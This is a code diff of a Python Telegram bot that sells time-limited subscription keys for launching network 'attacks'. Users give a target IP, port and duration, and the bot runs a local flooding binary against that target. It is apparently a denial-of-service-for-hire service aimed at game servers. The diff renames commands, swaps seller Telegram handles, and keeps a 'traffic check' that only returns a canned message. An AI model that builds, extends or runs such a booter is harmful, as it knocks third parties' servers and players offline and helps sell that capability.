@@ -106,10 +106,10 @@ def generate_unique_id(length=10):
 # Function to generate main menu keyboard
 def main_menu_keyboard():
     return ReplyKeyboardMarkup([ 
-        [KeyboardButton("/wdvc")],
+        [KeyboardButton("/Wdvc")],
         [KeyboardButton("/resume ▶️"), KeyboardButton("/pause ⏸️")],
         [KeyboardButton("/view_attacks 📊")], [KeyboardButton("/stop_attack")],
-        [KeyboardButton("/check_wdvc_traffic 📈 ")], 
+        [KeyboardButton("/check_Wdvc_traffic 📈 ")], 
         [KeyboardButton("/help ℹ️")],
         [KeyboardButton("/genkey 3 hours")],
         [KeyboardButton("/allusers")],
@@ -136,19 +136,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     username = update.message.from_user.username
     if user_id not in users:
-        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @WerewolfDemon", reply_markup=main_menu_keyboard())
+        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @Itz_sonu_9", reply_markup=main_menu_keyboard())
     else:
         expiration_date = users[user_id]
-        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @WerewolfDemon", reply_markup=main_menu_keyboard())
+        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @Itz_sonu_9", reply_markup=main_menu_keyboard())
 
-async def wdvc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
         await update.message.reply_text("❌ You don't have an active subscription.")
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text("🛡️ Usage: /wdvc <target_ip> <port> <duration>")
+        await update.message.reply_text("🛡️ Usage: /Wdvc <target_ip> <port> <duration>")
         return
 
     target_ip = context.args[0]
@@ -165,7 +165,7 @@ async def wdvc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     # Updated command to remove protocol (udp/tcp)
-    command = ['./wdvc', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
+    command = ['./Wdvc', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
     try:
         process = subprocess.Popen(command)
         # Generate and display a unique attack ID
@@ -260,9 +260,9 @@ async def attack_remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     if not attack_found:
         await update.message.reply_text(f"❌ No attack found with ID {attack_id}.")
 
-async def check_wdvc_traffic(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Simulate checking wdvc traffic
-    await update.message.reply_text("📈 Checking wdvc traffic...\nThe current traffic status is normal. No issues detected.")
+async def check_bgmi_traffic(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    # Simulate checking BGMI traffic
+    await update.message.reply_text("📈 Checking Wdvc traffic...\nThe current traffic status is normal. No issues detected.")
 
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
@@ -287,7 +287,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @WerewolfDemon."
+        response = "ONLY OWNER CAN USE💀OWNER @WerewolfDemon"
 
     await update.message.reply_text(response)
 
@@ -309,7 +309,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_keys()
             response = f"✅Key redeemed successfully!"
         else:
-            response = "Invalid or expired key buy from @WerewolfDemon."
+            response = "Invalid or expired key buy from @WerewolfDemon"
     else:
         response = "Usage: /redeem <key>"
 
@@ -336,13 +336,13 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("ℹ️ Help Menu:\n"
                                       "/start - Start the bot\n"
-                                      "/wdvc - Start a new attack\n"
+                                      "/Wdvc - Start a new attack\n"
                                       "/stop_attack - Stop an ongoing attack\n"
                                       "/pause - Pause an ongoing attack\n"
                                       "/resume - Resume a paused attack\n"
                                       "/view_attacks - View ongoing attacks\n"
                                       "/attack_remove - Remove an attack using its ID\n"
-                                      "/check_wdvc_traffic - Check current wdvc traffic\n"
+                                      "/check_Wdvc_traffic - Check current Wdvc traffic\n"
                                       "/redeem - Redeem your key\n"
                                       "/genkey - Generate a key (Admin only)\n"
                                       "/allusers - Show all users (Admin only)\n"
@@ -353,18 +353,16 @@ if __name__ == '__main__':
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("wdvc", wdvc))
+    app.add_handler(CommandHandler("Wdvc", bgmi))
     app.add_handler(CommandHandler("stop_attack", stop_attack))
     app.add_handler(CommandHandler("pause", pause_attack))
     app.add_handler(CommandHandler("resume", resume_attack))
     app.add_handler(CommandHandler("view_attacks", view_attacks))
     app.add_handler(CommandHandler("attack_remove", attack_remove))
-    app.add_handler(CommandHandler("check_wdvc_traffic", check_wdvc_traffic))
+    app.add_handler(CommandHandler("check_Wdvc_traffic", check_bgmi_traffic))
     app.add_handler(CommandHandler("genkey", genkey))
     app.add_handler(CommandHandler("redeem", redeem))
     app.add_handler(CommandHandler("allusers", allusers))
     app.add_handler(CommandHandler("help", help_command))
 
     app.run_polling()
-
-
